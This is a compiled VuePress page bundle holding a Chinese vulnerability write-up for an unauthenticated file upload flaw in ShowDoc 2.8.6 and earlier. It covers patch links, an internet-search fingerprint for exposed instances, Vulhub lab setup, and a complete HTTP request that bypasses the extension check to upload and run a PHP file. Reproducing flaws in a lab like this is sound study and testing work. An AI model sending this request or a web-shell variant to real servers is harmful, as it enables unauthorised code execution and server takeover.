import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o,c as s,a as e,b as a,d as n,e as r}from"./app-58e4a7d6.js";const l={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),h=e("p",null,"Showdoc 是一个开源的在线共享文档工具。",-1),u=e("p",null,"Showdoc <= 2.8.6 存在 uploadImg 文件上传漏洞，该漏洞源于未正确使用 upload 方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限等。",-1),p=e("p",null,"参考链接：",-1),m={href:"https://github.com/star7th/showdoc/pull/1059",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f",target:"_blank",rel:"noopener noreferrer"},g=r(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Showdoc &lt;= 2.8.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ShowDoc&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 ShowDoc 2.8.2 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，安装，初始账号密码 <code>showdoc/123456</code>。访问 <code>http://your-ip:8080</code> 即可查看到 ShowDoc 的主页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603133023021.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下请求上传一个 PHP 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Length: 216


------WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Disposition: form-data; name=&quot;editormd-image-file&quot;; filename=&quot;test.&lt;&gt;php&quot;
Content-Type: text/plain

&lt;?=phpinfo();?&gt;
------WebKitFormBoundaryBCbwAmmXaS7UssMW--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>PHP 文件路径将返回在数据包中：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603133735578.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问即可查看到 <code>phpinfo()</code> 执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/Public/Uploads/2024-06-03/665d568d2cdd9.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603133858048.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17);function f(_,x){const i=d("ExternalLinkIcon");return o(),s("div",null,[c,h,u,p,e("ul",null,[e("li",null,[e("a",m,[a("https://github.com/star7th/showdoc/pull/1059"),n(i)])]),e("li",null,[e("a",b,[a("https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a"),n(i)])]),e("li",null,[e("a",v,[a("https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f"),n(i)])])]),g])}const C=t(l,[["render",f],["__file","ShowDoc 前台任意文件上传 CNVD-2020-26585.html.vue"]]);export{C as default};
